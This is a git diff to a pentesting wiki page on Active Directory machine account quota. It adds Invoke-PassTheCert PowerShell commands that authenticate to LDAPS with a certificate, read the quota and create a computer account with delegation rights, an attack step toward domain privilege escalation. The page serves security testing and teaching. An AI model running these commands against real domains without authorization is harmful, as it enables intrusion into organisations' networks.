@@ -1,5 +1,5 @@
 ---
-authors: ShutdownRepo, mpgn, noraj, sckdev
+authors: ShutdownRepo, mpgn, noraj, sckdev, jamarir
 category: ad
 ---
 
@@ -84,6 +84,24 @@ FuzzSecurity's [StandIn](https://github.com/FuzzySecurity/StandIn) project is an
 StandIn.exe --object ms-DS-MachineAccountQuota=*
 ```
 
+
+Another alternative is to use [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell)
+
+> Note: the README contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
+```powershell
+# Import the PowerShell script and show its manual
+Import-Module .\Invoke-PassTheCert.ps1
+.\Invoke-PassTheCert.ps1 -?
+# Authenticate to LDAP/S
+$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
+# List all the available actions
+Invoke-PassTheCert -a -NoBanner
+
+# Returns all the objects of class `domain` in the `ADLAB.LOCAL` domain, and extract the MAQ attribute
+Invoke-PassTheCert -Action 'Filter' -LdapConnection $LdapConnection -SearchBase 'DC=ADLAB,DC=LOCAL' -SearchScope Subtree -Properties * -LDAPFilter '(objectClass=domain)' |Select-Object distinguishedName,ms-DS-MachineAccountQuota
+```
+
+
 :::
 
 
@@ -160,6 +178,22 @@ StandIn.exe --computer 'PENTEST01' --disable
 
 # Delete the account (requires elevated rights)
 StandIn.exe --computer 'PENTEST01' --delete
+```
+
+Another alternative is to use [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell)
+
+> Note: the README contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
+```powershell
+# Import the PowerShell script and show its manual
+Import-Module .\Invoke-PassTheCert.ps1
+.\Invoke-PassTheCert.ps1 -?
+# Authenticate to LDAP/S
+$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
+# List all the available actions
+Invoke-PassTheCert -a -NoBanner
+
+# Create the computer with sAMAccountName 'COMPUTATOR$', with UAC flags 'WORKSTATION_TRUST_ACCOUNT,TRUSTED_TO_AUTH_FOR_DELEGATION'
+Invoke-PassTheCert -Action 'CreateObject' -LdapConnection $LdapConnection -ObjectType 'Computer' -Object 'CN=COMPUTATOR,CN=Computers,DC=X' -sAMAccountName 'COMPUTATOR$' -NewPassword 'P@ssw0rd123!' -UACFlags 'WORKSTATION_TRUST_ACCOUNT,TRUSTED_TO_AUTH_FOR_DELEGATION'
 ```
 
 :::
